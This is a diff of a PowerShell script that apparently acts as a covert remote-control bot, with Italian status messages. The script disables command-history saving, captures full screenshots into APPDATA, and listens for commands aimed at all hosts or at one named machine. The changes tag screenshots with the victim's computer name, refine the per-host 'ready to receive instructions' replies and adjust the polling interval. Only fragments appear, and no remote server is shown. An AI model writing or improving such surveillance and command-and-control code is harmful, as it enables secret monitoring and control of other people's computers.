@@ -1,5 +1,6 @@
 
 Clear-Host
+
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
 
@@ -47,7 +48,7 @@ function GetScreenshot
         $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
         $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size)
-        $outputPath = Join-Path $env:APPDATA "screen.png"
+        $outputPath = Join-Path $env:APPDATA ("screen_"+$env:COMPUTERNAME+".png")
         $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
         $bitmap.Dispose()
         $graphics.Dispose()
@@ -195,10 +196,13 @@ function CommandListener
                         if ($check_command[0] -match "SET") {
                             if ($check_command[1] -match "ALL") {
                                 $hostname = $hostia
+                                SendMessage "Computer pronto a ricevere istruzioni"
                             } else {
                                 $hostname = $check_command[1]
+                                if ($env:COMPUTERNAME -match $hostname) {
+                                    SendMessage "Computer pronto a ricevere istruzioni"
+                                }
                             }
-                            SendMessage "Computer pronto a ricevere istruzioni"
                             continue
                         }
                         
@@ -253,7 +257,7 @@ function CommandListener
                     $wait = 900
             }
 
-            if ($wait -eq 10000) {
+            if ($wait -eq 5000) {
                 $wait = 1000
             } else {
                 $wait = $wait + 100
